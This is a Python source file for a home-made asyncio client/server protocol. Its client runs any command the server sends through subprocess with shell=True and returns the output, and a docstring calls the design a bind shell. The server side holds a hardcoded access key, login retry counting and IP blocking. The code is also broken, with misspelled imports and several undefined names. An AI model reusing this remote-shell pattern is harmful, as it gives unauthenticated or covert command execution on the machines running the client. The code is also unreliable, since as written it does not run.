CODECS_FLE = {
    '0x00':{'HEADER':'0x00','CONTENT':'{result}','FLAG':'0x00'},
    '0x01':{'HEADER':'0x01','CONTENT':'{error}'},
    '0X02':{'HEADER':'0X02','CONTENT':'null'},
    '0X04':{'HEADER':'0X04','CONTENT':'null'},
    '0x06':{'HEADER':'0x06','CONTENT':None},# comand
    '0x07':{'HEADER':'0x07','CONTENT':'{socket}'},
    '0x08':{'HEADER':'0x08','CONTENT':'{socket}'},
    '0x09':{'HEADER':'0x09','CONTENT':'null'},
    '0x10':{'HEADER':'0x10','IDN':'{IDN}'},
    '0x11':{'HEADER':'0x11','CONTENT':['{file_path}','{content}']}
    
}
# bouth
from json import dumps,lodas
import asyncio
# clients libs
from subprocess import run
# server libs
from datetime import datetime
from secrets import compare_digest

class CGhiosProtocol(asyncio.Protocol):
    def __init__(self,on_con_lost):
        self.stringfyJSON = lambda dict: dumps(dict).encode('utf-8')
        self.on_con_lost = on_con_lost
        self.ERRORS = {
            'null':{'HEADER':'0x01','CONTENT':'the command cannot be a null type !'},
            'command':{'HEADER':'0x01','CONTENT':'{content}','FLAG':'0x06'},
            'code':{'HEADER':'0x01','CONTENT':'code error woops! on: {content}','FLAG':'0xFF'}
        }
    def start_connection(self):
        pk = CODECS_FLE.get('0x04')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def on_readyClient(self):
        ''' this function sends [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X09)
        this will complete the handshake with the server and client and it indicate what the client is ready for recive options
        this function can be used when the client execute some order or in the handshake 
        so it is a waiting signal !
        '''
        pk = CODECS_FLE.get('0x09')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def endOfSession(self):
        self._transport.write(self.stringfyJSON(CODECS_FLE.get('0x02')))
    def sendError(self,key,content=None):
        if content:
            # if we needs to write some content error
            err = self.ERRORS.get(key)
            err['CONTENT'].format(content=content)
            # XXX: possible bug warning here!
            self._transport.write(self.stringfyJSON(err))
        else:
            self._transport.write(self.stringfyJSON(self.ERRORS.get(key)))
    def onSucress(self,content,flag):
        cc = CODECS_FLE.get('0x00')
        cc['CONTENT'] = content
        cc['FLAG'] = flag
        self._transport.write(self.stringfyJSON(cc))
        # sends the good news to the server
    def execute_command(self,package:dict[str,str | list[str]]):
        cmd = package.get('CONTENT')
        if cmd or cmd == '':
            try:
                # ? test tis code:
                # result = self._transport.run(cmd,shell=True,capture_output=True,text=True)
                # this can work
                
                result = run(cmd,shell=True,capture_output=True,text=True)# execute the command and returns a string unicode
                stdrr = result.stderr
                stdout = result.stdout
                if result.stderr:
                    self.sendError(key='command',content=result.stderr)
                else:
                    self.onSucress(content=stdout,flag='0x06')
                    # execute command sucressful
            except Error as e:
                self.sendError(key='command',content=str(e))
                pass
        else:
            self.sendError(key='null')
            # error or '' 
    def onLogin(self,IDN:str):
        ''' this function will try to login as a client admin in the server
        this can be used for change commands and communicate with the client
        like a p2p protocol but ussing only a single socket
        this is maked with the objective of make a bind shell and not create
        a server in the client side.
        '''
        cc = CODECS_FLE.get('0x10')
        if IDN:
            cc['IDN'] = IDN
            self._transport.write(cc)
        else:
            raise NameError('IDN HASNNOT SETTED BAD USAGE OF METHOD!')
    def loginError(self,package:dict[str,str]):
        '''it throws a exeption if the error its an error login'''
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x10':
            raise NameError('INCORRECT IDN ERROR !')
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x12':
            raise NameError('TIME OUT ERROR ! \n RE LOG')
    def onSucressRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        # this function will be used for merge a sucress content
        # if the flag is the sance of the content flag
        # then we will call the function
        
        if package.get('FLAG') == flag and package.get('HEADER') == '0x00':
            callback(*args,**kwargs)
    def onErrorRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        if package.get('FLAG') == flag and package.get('HEADER') == '0x01':
            callback(*args,**kwargs) 
    def connection_made(self, transport):
        self._transport = transport
        self.start_connection()
        # if we need to make some thing between sends the wait signal then here will add
        # function between()
        self.on_readyClient()
    def writeInServer(self,file_path:str,content:dict[str,str]):
        # wtite code in the server
        cc = CODECS_FLE.get('0x11')
        cc['CONTENT'] = [file_path,content]
        self._transport.write(self.stringfyJSON(cc))
    def clientProtocol(self,package):
        match package.get('HEADER'):
            case '0x06':
                # [CLIENT] - (0x06 COMMAND) <- [SERVER]
                self.execute_command(package)  
    def data_received(self, data):
        self.analyser(data)
        print('Data received: {!r}'.format(data.decode('utf-8')))
        #system(self.message)      
    def connection_lost(self, exc):
        print('The server closed the connection')
        self.on_con_lost.set_result(True)

IDN = '829HNDKMLSM09xmakcankancjkanc0iqwucbau'
class SGhiosProtocol(asyncio.Protocol):
    file = CODECS_FLE.get('0x06')# dict:[str,str]
    MAX_TRYS = 3
    MAX_SESSION_TIME = 50# seconds
    def __init__(self):
        self.ERRORS = {
            'connection':{'HEADER':'0x01','CONTENT':'connection time out','Flag':'0x10'},
            'login':{'HEADER':'0x01','CONTENT':'IDN ERROR','FLAG':'0x10'}
        }
        self._transport:asyncio.BaseTransports = None
        self._out = ''
        self._err = ''
        self._ReadyConnections:dict[str,asyncio] = dict()# pool of ready connections
        # self._adminConnections = dict()
        # requests of admin client 
        # no se mezclan las peticiones
        self._bloquedIp = []# attacks
        self._CounterTrys = dict()
        # dict of counter trys {'transport name':trys}
        # {'hommelander':3}
        self._Sessions = dict()
        # this dict will use for 
        # save the connection logeds and 
        self.stringfyJSON = lambda dict: dumps(dict).encode('utf-8')
    
    def onSucress(self,content,flag):
        cc = CODECS_FLE.get('0x00')
        cc['CONTENT'] = content
        cc['FLAG'] = flag
        self._transport.write(self.stringfyJSON(cc))
        # sends the good news to the client
    
    def sendError(self,key,content=None):
        if content:
            # if we needs to write some content error
            err = self.ERRORS.get(key)
            err['CONTENT'].format(content=content)
            # XXX: possible bug warning here!
            self._transport.write(self.stringfyJSON(err))
        else:
            self._transport.write(self.stringfyJSON(self.ERRORS.get(key)))
    def sendExecuteCommand(self):
        '''
        this method will read a file (vareable) and sends the content
        the file includes a package to send for example
        {"HEADER":'0x06','CONTENT':"hello !"}'''
        self._transport.write(SGhiosProtocol.file)
    def onSucressRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        # this function will be used for merge a sucress content
        # if the flag is the sance of the content flag
        # then we will call the function
        
        if package.get('FLAG') == flag and package.get('HEADER') == '0x00':
            callback(*args,**kwargs)
    def onErrorRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        if package.get('FLAG') == flag and package.get('HEADER') == '0x01':
            callback(*args,**kwargs)
            
    def addToCounterTransport(self):
        ''' 
        this method will add the self._transport to a
        CounterTransport atribute to calculate how many attemps
        have left
        '''
        self._CounterTrys[self._transport.get_extra_info('peername')] = SGhiosProtocol.MAX_TRYS
    
    
    def closeAllConnections(self):
        ''' cierra todas las conexiones listas '''
        for key,x in self._ReadyConnections.items():
            if not(x.is_closing()):
                x.close()# kill them
                
    def RefreshConnection(self):
        ''' this method will check if the connection still alive 
        and will drop the connections what are closed of the ReadyConnections attribute '''
        for x in self._ReadyConnections.keys():
            if self._ReadyConnections[x].is_closing():
                del self._ReadyConnections[x]

    def checkTimeOutSession(self):
        ''' this method will check if some Session expires 
        or if the connection was closed ''' 
        for key,x in self._Sessions.items():
            if x[0].is_closing():
                # delete them
                #del self._Sessions[key]
                self.removeLoggingSession(connection_name=key)
            if SGhiosProtocol.MAX_SESSION_TIME - x[1].minute == 0:
                # si es cero la sesion expiro 
                #del self._Sessions[key]
                self.removeLoggingSession(connection_name=key)
                # lo eliminamos
                x[0].close()
                # cerramos la conexion
                # enviamos un error de tiempo agotado
                self.sendError(key=CODECS_FLE.get('0x10'))
                 
    def saveLoggingSession(self):
        ''' 
        this method will save the connection made with the admin
        and save a time of logging  
        
        '''
        self._Sessions[self._transport.get_extra_info('peername')] = [self._transport,datetime.now()]
    def removeLoggingSession(self,connection_name:asyncio.BaseTransport):
        ''' this method will delete some session of the dicts sessions file '''
        del self._Sessions[connection_name.get_extra_info('peername')]
        
    
    def removeCunterTrys(self):
        '''
        this method will remove the connection from the counterTrys
        used if the user has logging succressful
        ''' 
        try:
            del self._CounterTrys[self._transport.get_extra_info('peername')]
        except:
            print('no saved !')
    def decrementTry(self,connection_name:str):
        ''' this method will decrement the number of trys of a connection '''
        buff = self._CounterTrys[connection_name]
        if buff[1] > 0:
            
            buff[1] -= 1
        else:
            raise NameError('UNDECREMENT ERROR')
        self._CounterTrys[connection_name] = buff
    def checkIfIsZeroCounter(self,connection_name:str):
        buff = self._CounterTrys.get(connection_name)
        if buff:
            if buff[1] == 0:
                return True
            else:
                # si no es falso
                return False
        # si no esta logeado es None
        return None
    def addToBloquedIP(self):
        self.removeCunterTrys()
        # drop the connection name of the counter trys
        self._bloquedIp.append(self._transport.get_extra_info('peername'))
        # add to a bloqued ip list
    def onLogin(self,package:dict[str,str]):
        ''' on package 0x10 start the auth process 
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X10) -- LOGIN
        IF [SERVER] - (PACKAGE WITH HEADER 0X01 (ERROR ?)) -> [CLIENT ADMIN ]-- IF THE IDN ITS INCORRECT 
            ! > SERVER SIDE ADD THE TRANSPORT TO A POOL OF ADMIN COMMUNICATIONS 
            ! > SERVER SIDE COUNTER OF TRYS WHAT THE USER CAN MAKE FOR LOGIN DECREMENTS
            ! > IF THE SERVER SIDE COUNTER ITS EQUAL TO ZERO THEN THE SERVER ADD THE IP TO A BAD GUYS LIST
        
        this method return a bool result
        True -> the connection 
        '''
        if package.get('HEADER') == '0x10':
            zero = self.checkIfIsZeroCounter(connection_name=self._transport.get_extra_info('peername'))
            if not(zero):
                # if not is zero
                if compare_digest(DIN,package.get('IDN')):
                    # compare if the IDN ITS THE SANCE 
                    # if its the sance start the session time counter

                    # will call save login for save the connection
                    # and remove it form counter trys

                    self.saveLoggingSession()
                    self.removeCunterTrys()

                    # we save a time of loging inside the saveLogin
                    
                    # we send a succressful message to the
                    # client notified what now its logged
                    
                    self.onSucress(content=True, flag='0x10')
                    
                    # start decrement time to live sesson!
                    pass
                else:
                    self.decrementTry(connection_name=self._transport.get_extra_info('peername'))
                    # decrements and send a error messaje
                    self.sendError(key='login')
            elif (zero == False):
                # add to bad's guy list
                self.addToBloquedIP()
                self._transport.close()
                # closes the connection
            
            else:
                self.addToCounterTransport()
    
    def closeVoluntuaryAdminSession(self):
        ''' this method will close the admin session 
        use it if the client sends a package 0x02

        -- CLOSE THE CONNECTION 
        -- VOLUNTUARY (WHEN THE ADMIN CLIENT SENDS A SIGNAL OF EXIT)
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X02)
        [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X02) <- [SERVER]
        s'''
        self._transport.write(CODECS_FLE.get('0x02'))
        # remove from Session dictonary
        self.removeLoggingSession(connection_name=self._transport.get_extra_info('peername'))

    
    def onWaitingConnection(self,package:dict[str,str]):
        if package.get('HEADER') == '0x04':
            # new connection
            self._ReadyConnections[self._transport.get_extra_info('peername')] = self._transport
        
    def startConnection(self):
        # 0x04 new connection
        # 0x09 waiting
        # this method will check if the connection issnot in the bad guys ip's 
        if self._transport.get_extra_info('peername') in self._bloquedIp:
            self._transport.close()
            # closes the connection
    
            
            
    def check_codec(self,codec:str) -> bool:
        '''
        checa si el codigo esta en el codecs file
        '''
        if CODECS_FLE.get(codec,None):
            return True
        return False
    
    def connection_made(self, transport):
        '''
        esto permitira preocuparnos menos por el medio y mas por el protocolo 
        con el metodo write escribimos en el protocolo de tranposrte sea el que sea
        el mensaje
        
        todos los metodos se mandaran a llamar despeus de la conexion entrante
        '''
        # self.out = 
        print(f" conexion entrante {transport.get_extra_info('peername')}")
        self._transport = transport
        self.startConnection()
        # check if it isnnot in the bad guys list's
        
    def data_received(self, data):
        '''
        funcion que se ejecutara si se recibe un dato
        HEADER:
            CODEC_FLE
        CONTENT:
            CONTENT
        '''
        print(data.decode('utf-8'))
        ddt = loads(data.decode('utf-8'))
        dd = ddt.get('HEADER')
        
        if dd in ERRORS_FLE:
            self.err = CODECS_FLE.get(dd)
        else:
            self.out = CODECS_FLE.get(dd)
        self.analyserThram(ddt)
